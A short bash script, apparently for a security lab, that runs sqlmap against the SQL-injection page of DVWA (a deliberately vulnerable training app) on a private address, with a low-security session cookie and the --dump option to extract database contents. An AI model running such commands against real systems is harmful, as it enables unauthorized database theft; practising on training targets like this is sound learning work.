#!/bin/bash\necho 'Executando SQLMap...'
sqlmap -u "http://192.168.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=xyz" --dump